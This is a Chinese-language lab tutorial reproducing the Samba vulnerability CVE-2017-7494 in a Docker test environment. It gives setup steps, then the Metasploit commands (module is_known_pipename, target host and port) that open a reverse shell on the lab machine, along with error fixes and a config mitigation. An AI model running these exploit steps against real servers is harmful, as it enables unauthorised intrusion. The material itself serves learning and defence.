## **一、漏洞分析**

 **1.漏洞别名：**  
CVE-2017-7494称为Linux版的永恒之蓝

 **2.漏洞用来做什么：**  
该漏洞用来，远程反弹shell并[提权](https://so.csdn.net/so/search?q=%E6%8F%90%E6%9D%83&spm=1001.2101.3001.7020)

 **3.漏洞适合的环境：**  
[Samba](https://so.csdn.net/so/search?q=Samba&spm=1001.2101.3001.7020)3.5.0到4.6.4/4.5.10/4.4.14的中间版本。  
//也就是Samba 3.5.0之后的所有版本，在4.6.4/4.5.10/4.4.14修复了这个漏洞。

## 二漏洞复现

###  **1.相关信息：**

 **①IP地址跟版本：**

靶机| 攻击机  
---|---  
192.168.97.104| 192.168.97.99  
Ubuntu16.04.4| Kali2.0  
  
 **②靶机：**

ubuntu16.04| CVE-2017-7494的环境搭建附件链接  
---|---  
链接：https://pan.baidu.com/s/1BaJv5I22rZTk7Av_7z0u6w| 网盘地址：
https://pan.baidu.com/s/1hJmICRP4casbgTUTgA2DIg  
提取码：sz95| 提取码：w8yb  
快照1为，原始环境，可以用于练习搭建| 把该附件拷贝到虚拟机\靶机ubuntu中  
快照6为搭建好的环境|  
  
  
 **③攻击机：**

攻击机KALI2.0  
---  
网盘地址：链接：https://pan.baidu.com/s/1jPebJEN2RYCIONW3Fs-XAA  
提取码：iiw0  
  
 **2.环境搭建过程：**

![1667785106_6368619266d7de0eb8b7c.png!small?1667785106396](https://image.3001.net/images/20221107/1667785106_6368619266d7de0eb8b7c.png!small?1667785106396)

①选择原始快照

②把靶机环境的附件拷贝到qwsn目录下CVE-2017-7494

![1667785257_63686229bc4c69dd416d0.png!small?1667785257788](https://image.3001.net/images/20221107/1667785257_63686229bc4c69dd416d0.png!small?1667785257788)

③把用户qwsn加入到doker组中：`sudo usermod qwsn -g docker`  
//为了之后的环境运行

④下载docker：`sudo apt-get install
docker`![1667785325_6368626db89f67004eb7b.png!small?1667785325825](https://image.3001.net/images/20221107/1667785325_6368626db89f67004eb7b.png!small?1667785325825)⑤下载docker-compose：`sudo apt-get install docker-compose`![1667785348_63686284725e7d8c02b8f.png!small?1667785348726](https://image.3001.net/images/20221107/1667785348_63686284725e7d8c02b8f.png!small?1667785348726)⑥进入到CVE-2017-7494目录下，执行docker-compose up -d，开始运行测试环境：  
//这条命令是下载samba的环境，并且会同时开启samba服务

cd /home/qwsnCVE-2017-7494

docker-compose up -d

![1667785425_636862d139113c9fe37c0.png!small?1667785425282](https://image.3001.net/images/20221107/1667785425_636862d139113c9fe37c0.png!small?1667785425282)//注意，若报如下的错误：那么我们刚刚把qwsn加入到组后，还要再再重新登录该用户，即可。

![1667785446_636862e6c936019e22b6d.png!small?1667785446930](https://image.3001.net/images/20221107/1667785446_636862e6c936019e22b6d.png!small?1667785446930)⑦测试环境运行后，查看端口状态：`docker
ps
-a`![1667785468_636862fcd4353ca4dd8bf.png!small?1667785468981](https://image.3001.net/images/20221107/1667785468_636862fcd4353ca4dd8bf.png!small?1667785468981)`⑧如⑦中所示，测试环境运行后，445端口开启了。`⑨在本机测试一下我们的环境：  
安装smbclient，`sudo apt-get install
smbclient`![1667785509_6368632516bb3e01b7414.png!small?1667785509166](https://image.3001.net/images/20221107/1667785509_6368632516bb3e01b7414.png!small?1667785509166)用本地连接测试：`smbclient
//127.0.0.1/myshare
-N`![1667785531_6368633bb22c3aeaacdad.png!small?1667785531768](https://image.3001.net/images/20221107/1667785531_6368633bb22c3aeaacdad.png!small?1667785531768)
**3.攻击过程：**  
①打开KALI2.0，开启终端terminal

![1667785552_63686350955fcac0f541f.png!small?1667785552723](https://image.3001.net/images/20221107/1667785552_63686350955fcac0f541f.png!small?1667785552723)②进入msfconsole：
`msfconsole````![1667785595_6368637b8aec5c48cc726.png!small?1667785595589](https://image.3001.net/images/20221107/1667785595_6368637b8aec5c48cc726.png!small?1667785595589)  
③use expolit/linux/samba/is_known_pipename  
④set rhosts 192.168.97.104  
⑤set rport 445  
⑥run`![1667785616_6368639012cacdf1d477e.png!small?1667785616288](https://image.3001.net/images/20221107/1667785616_6368639012cacdf1d477e.png!small?1667785616288)⑦在kali2.0上验证：

![1667785641_636863a99b0959f017e90.png!small](https://image.3001.net/images/20221107/1667785641_636863a99b0959f017e90.png!small)

  

## 三、注意

1.重启靶机后，要重新执行该命令：`docker-compose up -d`  
//为了重启服务，开启测试环境

2.在msf复现过程中如果遇到下面报错

Exploit failed: RubySMB::Error::EncryptionError Communication error with the
remote host: Socket read returned nil. The server supports encryption but was
not able to handle the encrypted request.

解决方法参考

输入

msf6 exploit(linux/samba/is_known_pipename) > set SMB::AlwaysEncrypt false  
SMB::AlwaysEncrypt => false  
msf6 exploit(linux/samba/is_known_pipename) > set SMB::ProtocolVersion 1  
SMB::ProtocolVersion => 1

就可以了

![1667791820_63687bcca79c654b73fab.png!small?1667791820825](https://image.3001.net/images/20221107/1667791820_63687bcca79c654b73fab.png!small?1667791820825)

## 四、怎么预防这个漏洞呢？

1.你可以升级samba为4.6.4/4.5.10/4.4.14着三个版本中的一个  
2.不过最简单的，就是在/home/docker/CVE-2017-7494这个目录下编辑sbm.conf  
在【global】下一行，输入 `nt pipe support = no`，即可！

![1667785749_63686415da2c0ec2e12ca.png!small?1667785749913](https://image.3001.net/images/20221107/1667785749_63686415da2c0ec2e12ca.png!small?1667785749913)

3.kali2.0验证一下：

![1667785780_636864344ba7fee3236c0.png!small?1667785780466](https://image.3001.net/images/20221107/1667785780_636864344ba7fee3236c0.png!small?1667785780466)

//如图所示，反弹Shell失败

``

